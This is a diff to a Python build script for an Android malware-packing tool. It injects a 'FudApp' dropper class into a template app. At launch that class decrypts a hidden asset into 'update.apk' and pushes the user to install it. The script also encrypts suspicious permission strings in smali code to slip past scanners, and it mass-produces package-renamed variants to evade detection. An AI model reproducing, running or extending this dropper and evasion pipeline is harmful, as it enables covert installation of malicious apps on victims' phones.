@@ -11,13 +11,12 @@ import subprocess
 import random
 import string
 import base64
-import hashlib
 
 from config import (
-    TOOLS_DIR, JAVA_BIN, APKTOOL_JAR, BT_DIR,
+    TOOLS_DIR, JAVA_BIN, JAVAC_BIN, D8_BIN, APKTOOL_JAR, BT_DIR,
     APKSIGNER_BIN, ZIPALIGN_BIN, VARIANTS_DIR, TEMPLATE_APK,
-    VARIANT_COUNT, STRING_XOR_KEY,
-    URL_JRE, URL_APKTOOL, URL_BUILDTOOLS,
+    VARIANT_COUNT, STRING_XOR_KEY, ANDROID_JAR,
+    URL_JRE, URL_APKTOOL, URL_BUILDTOOLS, URL_ANDROID_JAR,
 )
 
 _READY_FLAG    = os.path.join(TOOLS_DIR, ".ready_v6")
@@ -27,6 +26,8 @@ _setup_lock = threading.Lock()
 _setup_done = threading.Event()
 _setup_error = {"exc": None}
 
+
+# ---------------------------------------------------------------- downloads
 
 def _download(url, dest):
     if os.path.exists(dest) and os.path.getsize(dest) > 0:
@@ -41,7 +42,7 @@ def _download(url, dest):
 
 
 def _extract_jre():
-    if os.path.exists(JAVA_BIN):
+    if os.path.exists(JAVA_BIN) and os.path.exists(JAVAC_BIN):
         return
     tgz = os.path.join(TOOLS_DIR, "jre.tgz")
     _download(URL_JRE, tgz)
@@ -56,11 +57,12 @@ def _extract_jre():
         if not os.path.isdir(full) or d == "jre":
             continue
         if ("jdk-" in d) or d.lower().startswith("jre"):
-            if os.path.exists(os.path.join(full, "bin", "java")):
+            if os.path.exists(os.path.join(full, "bin", "java")) and \
+               os.path.exists(os.path.join(full, "bin", "javac")):
                 picked = full
                 break
     if not picked:
-        raise RuntimeError("jre extract failed")
+        raise RuntimeError("jdk extract failed — javac not found")
     target = os.path.join(TOOLS_DIR, "jre")
     if os.path.exists(target):
         shutil.rmtree(target)
@@ -70,7 +72,7 @@ def _extract_jre():
 
 
 def _extract_build_tools():
-    if os.path.exists(APKSIGNER_BIN):
+    if os.path.exists(APKSIGNER_BIN) and os.path.exists(D8_BIN):
         return
     zpath = os.path.join(TOOLS_DIR, "bt.zip")
     _download(URL_BUILDTOOLS, zpath)
@@ -90,10 +92,12 @@ def _extract_build_tools():
     os.rename(picked, BT_DIR)
     if os.path.exists(zpath):
         os.remove(zpath)
-    for b in (APKSIGNER_BIN, ZIPALIGN_BIN, os.path.join(BT_DIR, "d8")):
+    for b in (APKSIGNER_BIN, ZIPALIGN_BIN, D8_BIN, os.path.join(BT_DIR, "aapt2")):
         if os.path.exists(b):
             os.chmod(b, os.stat(b).st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
 
+
+# ---------------------------------------------------------------- apktool
 
 def _rand_pkg():
     parts = []
@@ -125,7 +129,144 @@ def _apktool_b(src, out):
     )
 
 
-# ---------- string obfuscation ----------
+# ---------------------------------------------------------------- FudApp template + dex compile
+
+# NOTE: {SUPER} ko inject ke waqt original Application class se replace karte hain.
+_FUD_APP_TEMPLATE = """package com.system.fud;
+
+import android.app.Application;
+import android.content.Context;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Build;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+
+public class FudApp extends {SUPER} {
+
+    @Override
+    protected void attachBaseContext(Context base) {
+        super.attachBaseContext(base);
+        try { _drop(base); } catch (Throwable t) {}
+    }
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+    }
+
+    private static void _drop(Context ctx) throws Exception {
+        InputStream in = ctx.getAssets().open("p.bin");
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        byte[] buf = new byte[8192];
+        int n;
+        while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
+        in.close();
+        byte[] enc = bos.toByteArray();
+
+        byte[] key = new byte[] {
+            (byte)0xF1, (byte)0x79, (byte)0x78, (byte)0x72,
+            (byte)0xAC, (byte)0x69, (byte)0x3E, (byte)0xAA,
+            (byte)0xB1, (byte)0xA6, (byte)0x4F, (byte)0xB7,
+            (byte)0xF2, (byte)0xC6, (byte)0x30, (byte)0x02,
+            (byte)0x8D, (byte)0x4C, (byte)0x1A, (byte)0xE3,
+            (byte)0x7F, (byte)0x92, (byte)0xD5, (byte)0x6B,
+            (byte)0x2C, (byte)0x48, (byte)0x9E, (byte)0x11,
+            (byte)0x73, (byte)0xFA, (byte)0x05, (byte)0xB8
+        };
+
+        byte[] dec = new byte[enc.length];
+        for (int i = 0; i < enc.length; i++) {
+            int idx = (i * 7 + 3) % key.length;
+            dec[i] = (byte)((enc[i] ^ key[idx]) & 0xFF);
+        }
+
+        File out = new File(ctx.getFilesDir(), "update.apk");
+        FileOutputStream fos = new FileOutputStream(out);
+        fos.write(dec);
+        fos.close();
+        try { out.setReadable(true, false); } catch (Throwable t) {}
+
+        Intent i = new Intent(Intent.ACTION_VIEW);
+        Uri u = Uri.fromFile(out);
+        i.setDataAndType(u, "application/vnd.android.package-archive");
+        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
+        ctx.startActivity(i);
+    }
+}
+"""
+
+
+def _compile_dex(src_dir: str, out_dex: str):
+    """javac + d8 — .java se classes2.dex banata hai."""
+    if not os.path.exists(JAVAC_BIN):
+        raise RuntimeError(f"javac missing at {JAVAC_BIN}")
+    if not os.path.exists(D8_BIN):
+        raise RuntimeError(f"d8 missing at {D8_BIN}")
+
+    classes_dir = src_dir + "_classes"
+    if os.path.exists(classes_dir):
+        shutil.rmtree(classes_dir)
+    os.makedirs(classes_dir, exist_ok=True)
+
+    java_files = []
+    for root, _, files in os.walk(src_dir):
+        for f in files:
+            if f.endswith(".java"):
+                java_files.append(os.path.join(root, f))
+    if not java_files:
+        raise RuntimeError(f"no .java files in {src_dir}")
+
+    cp = ANDROID_JAR if os.path.exists(ANDROID_JAR) else None
+
+    cmd = [JAVAC_BIN, "-source", "8", "-target", "8",
+           "-encoding", "UTF-8", "-d", classes_dir]
+    if cp:
+        cmd += ["-cp", cp]
+    cmd += java_files
+
+    p = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
+    if p.returncode != 0:
+        raise RuntimeError(f"javac failed:\n{p.stdout}\n{p.stderr}")
+
+    class_files = []
+    for root, _, files in os.walk(classes_dir):
+        for f in files:
+            if f.endswith(".class"):
+                class_files.append(os.path.join(root, f))
+    if not class_files:
+        raise RuntimeError("javac produced no .class files")
+
+    out_dir = os.path.dirname(out_dex) or "."
+    os.makedirs(out_dir, exist_ok=True)
+    if os.path.exists(out_dex):
+        os.remove(out_dex)
+
+    d8_cmd = [D8_BIN, "--min-api", "21", "--no-desugaring",
+              "--output", out_dir]
+    if cp:
+        d8_cmd += ["--lib", cp]
+    d8_cmd += class_files
+
+    p = subprocess.run(d8_cmd, capture_output=True, text=True, timeout=300)
+    if p.returncode != 0:
+        raise RuntimeError(f"d8 failed:\n{p.stdout}\n{p.stderr}")
+
+    produced = os.path.join(out_dir, "classes.dex")
+    if not os.path.exists(produced):
+        raise RuntimeError("d8 produced no classes.dex")
+    if produced != out_dex:
+        if os.path.exists(out_dex):
+            os.remove(out_dex)
+        shutil.move(produced, out_dex)
+
+    shutil.rmtree(classes_dir, ignore_errors=True)
+    print(f"[✓] dex compiled → {out_dex}", flush=True)
+
+
+# ---------------------------------------------------------------- string obfuscation
 
 _SUSPICIOUS_PATTERNS = [
     "REQUEST_INSTALL_PACKAGES",
@@ -156,7 +297,7 @@ def _xor_str(s: str, key: str) -> bytes:
 
 
 def _make_stringcrypto_smali(key: str) -> str:
-    """Runtime decryptor: base64 → XOR → String. Java-free (pure smali)."""
+    """Runtime decryptor. .registers 9 hona zaroori — v0-v7 locals, p0=v8."""
     return """.class public LStringCrypto;
 .super Ljava/lang/Object;
 .source "SourceFile"
@@ -168,19 +309,18 @@ def _make_stringcrypto_smali(key: str) -> str:
 .end method
 
 .method public static d(Ljava/lang/String;)Ljava/lang/String;
-    .registers 8
+    .registers 9
+
     const/4 v0, 0x0
     :try_start_0
     invoke-static {p0, v0}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B
     move-result-object v1
 
     const-string v2, "%s"
-
     invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B
     move-result-object v2
 
     array-length v3, v2
-
     array-length v4, v1
     new-array v5, v4, [B
 
@@ -203,6 +343,7 @@ def _make_stringcrypto_smali(key: str) -> str:
     return-object v0
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
     :catch_0
     return-object p0
 .end method
@@ -210,35 +351,27 @@ def _make_stringcrypto_smali(key: str) -> str:
 
 
 def _obfuscate_smali_strings(decompiled_dir: str):
-    """Har smali file me suspicious strings ko encrypted form me badlo."""
     key = STRING_XOR_KEY
-    helper_path = None
-    for d in os.listdir(decompiled_dir):
-        full = os.path.join(decompiled_dir, d)
-        if not os.path.isdir(full):
-            continue
-        if d != "smali" and not d.startswith("smali_classes"):
-            continue
-        # StringCrypto class daalo
-        helper_dir = os.path.join(full)
-        hp = os.path.join(helper_dir, "StringCrypto.smali")
-        with open(hp, "w", encoding="utf-8") as f:
-            f.write(_make_stringcrypto_smali(key))
-        helper_path = hp
-        break
 
-    if not helper_path:
+    smali_dirs = []
+    for d in sorted(os.listdir(decompiled_dir)):
+        full = os.path.join(decompiled_dir, d)
+        if os.path.isdir(full) and (d == "smali" or d.startswith("smali_classes")):
+            smali_dirs.append(full)
+
+    if not smali_dirs:
         return
+
+    # StringCrypto ko pehle smali dir me daalo — classloader baaki dex se bhi resolve kar lega
+    hp = os.path.join(smali_dirs[0], "StringCrypto.smali")
+    with open(hp, "w", encoding="utf-8") as f:
+        f.write(_make_stringcrypto_smali(key))
 
     pattern = re.compile(r'(\s+)const-string (v\d+|p\d+), "((?:[^"\\]|\\.)*)"')
     fixed = 0
-    for d in os.listdir(decompiled_dir):
-        full = os.path.join(decompiled_dir, d)
-        if not os.path.isdir(full):
-            continue
-        if d != "smali" and not d.startswith("smali_classes"):
-            continue
-        for dirpath, _, files in os.walk(full):
+
+    for root in smali_dirs:
+        for dirpath, _, files in os.walk(root):
             for fn in files:
                 if not fn.endswith(".smali") or fn == "StringCrypto.smali":
                     continue
@@ -249,7 +382,6 @@ def _obfuscate_smali_strings(decompiled_dir: str):
                 except Exception:
                     continue
 
-                # check fast
                 if not any(p in txt for p in _SUSPICIOUS_PATTERNS):
                     continue
 
@@ -271,6 +403,8 @@ def _obfuscate_smali_strings(decompiled_dir: str):
 
     print(f"[✓] string obfuscation: {fixed} strings encrypted", flush=True)
 
+
+# ---------------------------------------------------------------- package rename
 
 def _rename(decompiled, new_pkg):
     manifest = os.path.join(decompiled, "AndroidManifest.xml")
@@ -330,6 +464,8 @@ def _rename(decompiled, new_pkg):
             f.write(txt)
 
 
+# ---------------------------------------------------------------- variants
+
 def _build_variants():
     if os.path.exists(_VARIANTS_FLAG):
         return
@@ -342,7 +478,6 @@ def _build_variants():
 
     print(f"[*] {VARIANT_COUNT} variants + string obfuscation ...", flush=True)
 
-    # pehla variant: full obfuscate + rename, phir usse copy + rename
     first = os.path.join(work, "v1")
     if os.path.exists(first):
         shutil.rmtree(first)
@@ -353,9 +488,7 @@ def _build_variants():
     for i in range(1, VARIANT_COUNT + 1):
         try:
             d = os.path.join(work, f"v{i}")
-            if i == 1:
-                pass  # already decompiled + obfuscated
-            else:
+            if i != 1:
                 if os.path.exists(d):
                     shutil.rmtree(d)
                 shutil.copytree(first, d)
@@ -365,7 +498,8 @@ def _build_variants():
             out = os.path.join(VARIANTS_DIR, f"t{i}.apk")
             _apktool_b(d, out)
             print(f"[✓] v{i}: {new_pkg}", flush=True)
-            shutil.rmtree(d, ignore_errors=True)
+            if i != 1:
+                shutil.rmtree(d, ignore_errors=True)
         except Exception as e:
             print(f"[!] v{i} failed: {e}", flush=True)
 
@@ -375,10 +509,13 @@ def _build_variants():
     print("[✓] variants ready", flush=True)
 
 
+# ---------------------------------------------------------------- setup
+
 def _do_setup():
     _extract_jre()
     _download(URL_APKTOOL, APKTOOL_JAR)
     _extract_build_tools()
+    _download(URL_ANDROID_JAR, ANDROID_JAR)
     with open(_READY_FLAG, "w") as f:
         f.write("ok")
     print("[✓] tools ready", flush=True)
